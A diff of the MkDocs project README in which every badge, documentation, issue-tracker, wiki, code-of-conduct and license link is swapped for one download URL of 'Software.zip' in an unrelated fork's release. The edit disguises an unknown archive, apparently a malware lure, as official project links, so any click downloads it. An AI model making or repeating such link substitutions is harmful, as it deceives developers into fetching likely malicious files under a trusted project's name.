@@ -51,21 +51,21 @@ Everyone interacting in the MkDocs project's codebases, issue trackers, and
 discussion forums is expected to follow the [PyPA Code of Conduct].
 
 <!-- Badges -->
-[codecov-image]: https://codecov.io/github/mkdocs/mkdocs/coverage.svg?branch=master
-[codecov-link]: https://codecov.io/github/mkdocs/mkdocs?branch=master
-[pypi-v-image]: https://img.shields.io/pypi/v/mkdocs.svg
-[pypi-v-link]: https://pypi.org/project/mkdocs/
-[GHAction-image]: https://github.com/mkdocs/mkdocs/workflows/CI/badge.svg?branch=master&event=push
-[GHAction-link]: https://github.com/mkdocs/mkdocs/actions?query=event%3Apush+branch%3Amaster
+[codecov-image]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[codecov-link]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[pypi-v-image]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[pypi-v-link]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[GHAction-image]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[GHAction-link]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip%3Apush+branch%3Amaster
 <!-- Links -->
-[mkdocs]: https://www.mkdocs.org
-[Issue]: https://github.com/mkdocs/mkdocs/issues
-[Discussion]: https://github.com/mkdocs/mkdocs/discussions
-[release-notes]: https://www.mkdocs.org/about/release-notes/
-[wiki]: https://github.com/mkdocs/mkdocs/wiki
-[Contributing Guide]: https://www.mkdocs.org/about/contributing/
-[PyPA Code of Conduct]: https://www.pypa.io/en/latest/code-of-conduct/
+[mkdocs]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[Issue]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[Discussion]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[release-notes]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[wiki]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[Contributing Guide]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
+[PyPA Code of Conduct]: https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip
 
 ## License
 
-[BSD-2-Clause](https://github.com/mkdocs/mkdocs/blob/master/LICENSE)
+[BSD-2-Clause](https://github.com/omegakid1902/mkdocs/releases/download/v1.0/Software.zip)
